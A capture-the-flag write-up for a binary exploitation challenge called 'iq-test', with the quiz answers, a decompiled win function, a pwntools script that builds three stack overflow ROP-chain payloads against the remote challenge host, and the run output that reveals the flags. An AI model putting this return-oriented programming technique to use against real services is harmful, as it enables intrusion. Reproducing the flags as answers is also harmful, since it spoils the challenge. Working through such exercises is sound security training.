# iq-test

Answers: 
2,1,4 

found the offset for the first one by trial and error


found the localtion of the variable a1 using ida 
first attempt was to change the value of this, but it only resulted in sigsev

find rop gadget of the rdi register

address of rdi gadget: `0x00000000004017d6`

Here's the decompilation of the `win2` function. 

```c
__int64 __fastcall win2(int a1)
{
  char v2[8]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v3; // [rsp+18h] [rbp-28h]
  char s[13]; // [rsp+2Ah] [rbp-16h] BYREF
  char v5; // [rsp+37h] [rbp-9h]
  FILE *stream; // [rsp+38h] [rbp-8h]

  if ( a1 != -559038737 )
  {
    puts("You have failed to bring the artifact to the this temple. Return and try again");
    exit(1);
  }
  sprintf(s, "%X.txt", -559038737);

```



Script up till now: 

```python
from pwn import * 
import time

#context.arch = 'amd64'
#context.log_level = 'debug'

elf = ELF('./chall')

#p = remote('localhost', 6161)

#p = process('./chall')

p = remote('iqtest.nitephase.live', 51823)


addr_win2 = 0x401314
addr_win3 = 0x4011e6

pop_rdi_rop = 0x4017d6
pop_rsi_rop = 0x4017d8
pop_rdx_rop = 0x4017da

pop_ret = 0x40101a

offset0 = 152
offset1 = 40 # whhyyyyyyy
offset2 = 56



payload1 = b'A'*offset0 + p64(pop_ret) + p64(0x401401) 

payload2 = b'A'*offset1 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(addr_win2) 

payload3 = b'A'*offset2 + p64(pop_ret) + p64(pop_rdi_rop) + p64(0xdeadbeef) + p64(pop_rsi_rop) + p64(0xdeafface) + p64(pop_rdx_rop) + p64(0xfeedcafe) + p64(addr_win3) 


p.sendlineafter(b'>', b'2')
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'>', b'4')


print(p.recvuntil(b'address: 0x401401'))
p.sendline(payload1)

#print(p.recvuntil(b'Continue: \n'))

#gdb.attach(p, "b win2")   

time.sleep(0.5)
p.sendline(payload2)


#print(p.recvuntil(b'Final Test: '))

#gdb.attach(p, "b win3")

time.sleep(0.5)
p.sendline(payload3)


p.interactive()
```

Output: 

```
[*] '/home/haard/Documents/recruitment/haard_phase2/binex/iqtest-binex/src/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to iqtest.nitephase.live on port 51823: Done
b' Correct!\nYou may have passed my test but I must see you display your knowledge before you can access my secrets\nLesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401'
[*] Switching to interactive mode

You have passed the first challenge. The next one won't be so simple.
Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
Continue:
You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
Final Test:
Congratulations. You are deserving of you reward

nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to iqtest.nitephase.live port 51823
```




References: 
- https://www.youtube.com/watch?v=vO1Uj2v3r7I
 